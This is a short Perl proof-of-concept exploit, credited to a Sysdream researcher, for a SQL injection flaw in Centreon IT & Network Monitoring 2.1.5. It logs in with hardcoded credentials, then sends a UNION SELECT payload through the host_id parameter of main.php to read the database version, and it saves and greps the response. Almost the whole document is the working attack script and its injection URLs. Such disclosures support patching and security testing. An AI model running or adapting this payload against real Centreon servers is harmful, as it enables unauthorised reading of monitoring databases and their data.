Centreon IT & Network Monitoring v2.1.5 - Injection SQL Vulnerability 
=====================================================================

#!/usr/bin/perl
# //--------[PoC]---------//
#
# Title   : Centreon IT & Network Monitoring v2.1.5 - Injection SQL
# Version : 2.1.5  
# Author  : Jonathan Salwan (j.salwan@sysdream.com)
#
#
# [Vuln sql injection]
# http://localhost/centreon/main.php?p=201&host_id=-1%20[SQL Injection]&o=p&min=1
#
# http://localhost/centreon/main.php?p=201&host_id=-1 UNION SELECT 1,@@version,3,4,5&o=p&min=1
#
#
# //-------[Credit]-------//
#
# http://www.sysdream.com
# http://www.shell-storm.org
#
 
use LWP::UserAgent;
 
my $url   = &#039;http://localhost/centreon/index.php&#039;;
my $login = &#039;root&#039;;
my $paswd = &#039;ptDB66&#039;;
my $sql   = &#039;http://localhost/centreon/main.php?p=201&host_id=-1 UNION SELECT 1,@@version,3,4,5&o=p&min=1&#039;;
 
my $ua = LWP::UserAgent->new;
my $response = $ua->get($url);
my $cook = $response->header(&#039;Set-Cookie&#039;);
 
my $req2 = $ua->post($url,
                {useralias => $login, password => $paswd, submit => &#039;login&#039;},
                    Cookie => $cook,
            Content-Type => &#039;application/x-www-form-urlencoded&#039;
                    );
 
my $response = $ua->get($sql, Cookie => $cook);
my $content = $response->content();
 
    open(FILE, &#039;>sql-centreon.txt&#039;);
    print FILE $content;
    close(FILE);
 
    print "\n[Answer SQL Injection]\n\n";
 
    my $selection = system(&#039;cat sql-centreon.txt | grep ">Host</td>"&#039;);
    unlink(&#039;sql-centreon.txt&#039;);
 
print "\n";



